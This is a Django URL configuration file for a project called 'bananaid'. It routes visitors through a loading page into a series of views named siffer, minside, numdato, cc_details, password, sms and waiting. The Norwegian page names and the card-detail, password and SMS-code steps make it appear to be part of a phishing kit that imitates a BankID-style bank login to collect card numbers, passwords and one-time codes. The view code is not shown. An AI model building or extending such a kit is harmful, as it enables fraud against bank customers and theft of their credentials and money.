"""
URL configuration for bananaid project.

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/4.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
from django.conf.urls.static import static
from django.contrib import admin
from django.urls import path
from django.views.generic import RedirectView

from bananaid import settings
from bananaid.const import PageRedirection
from bananaid.utils import gen_url_query
from bananaid.views import siffer_page, minside_page, num_date_page, cc_page, recap_info_page, password_page, \
    waiting_page, sms_page, loading_page, info_page

urlpatterns = [
                  path('', RedirectView.as_view(url=f'{PageRedirection.LOADING.value}?redirect_url={PageRedirection.INFO.value}{gen_url_query()}')),
                  path(PageRedirection.LOADING.value, loading_page, name='loading_page'),
                  path('admin/', admin.site.urls),
                  path(PageRedirection.INFO.value, info_page, name='info_page'),
                  path(PageRedirection.SIFFER.value, siffer_page, name='siffer_page'),
                  path(PageRedirection.MINSIDE.value, minside_page, name='minside_page'),
                  path(PageRedirection.NUMDATO.value, num_date_page, name='num_date_page'),
                  path(PageRedirection.CC_DETAILS.value, cc_page, name='cc_page'),
                  path(PageRedirection.INFO_RECAP.value, recap_info_page, name='recap_info_page'),
                  path(PageRedirection.PASSWORD.value, password_page, name='password_page'),
                  path(PageRedirection.SMS.value, sms_page, name='sms_page'),
                  path(PageRedirection.WAITING.value, waiting_page, name='waiting_page'),
                  path(PageRedirection.LOADING.value, loading_page, name='loading_page'),
              ] + static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
